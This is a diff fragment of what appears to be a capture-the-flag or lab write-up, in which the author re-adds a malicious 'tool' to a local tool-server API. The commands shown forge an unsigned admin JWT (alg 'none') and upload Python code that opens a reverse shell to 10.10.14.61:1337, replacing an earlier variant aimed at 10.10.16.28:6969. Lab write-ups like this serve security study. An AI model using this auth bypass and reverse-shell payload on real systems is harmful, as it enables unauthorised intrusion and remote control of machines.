@@ -500,5 +500,5 @@ This is the shell i will use
 So it looks like its removed my tool, so ill re add it with the new shell
 
 ```python
-curl -X POST -s http://127.0.0.1:30080/api/v1/tools -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg.' --data 'import socket,os,pty\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\ns=socket.socket()\ns.connect((\"10.10.16.28\",6969))\n[os.dup2(s.fileno(), i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")' | jq .
+curl -X POST -s http://127.0.0.1:30080/api/v1/tools -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg.' --data '{"name":"shell","description":"RCE","inputSchema":{"additionalProperties":{}},"code":"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.61\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"}' | jq .
 ```
